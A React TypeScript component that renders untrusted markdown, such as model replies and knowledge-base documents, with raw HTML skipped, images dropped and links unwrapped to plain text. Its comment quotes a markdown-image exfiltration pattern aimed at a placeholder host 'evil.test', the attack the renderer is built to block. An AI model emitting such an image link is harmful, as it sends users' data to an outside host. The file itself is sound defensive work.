import Markdown from "react-markdown";
import remarkGfm from "remark-gfm";

/**
 * Restricted renderer for UNTRUSTED text (model replies, KB/spec/evidence documents).
 *
 * - Raw HTML in the source is dropped (skipHtml) - it is never parsed into DOM nodes.
 * - Only basic text elements are allowed. Images are not rendered (blocks the
 *   "![x](https://evil.test/?d=<data>)" exfiltration pattern) and links are unwrapped
 *   to plain text, so nothing is fetched or clickable.
 *
 * This is presentation-layer hygiene for the demo UI. It is not a backend security control.
 */
const ALLOWED = [
  "p", "strong", "em", "del", "code", "pre", "blockquote", "ul", "ol", "li",
  "h1", "h2", "h3", "h4", "h5", "h6", "hr", "br",
  "table", "thead", "tbody", "tr", "th", "td",
];

export function SafeMarkdown({ text, className = "" }: { text: string; className?: string }) {
  return (
    <div className={`prose-safe ${className}`}>
      <Markdown remarkPlugins={[remarkGfm]} skipHtml allowedElements={ALLOWED} unwrapDisallowed>
        {text}
      </Markdown>
    </div>
  );
}
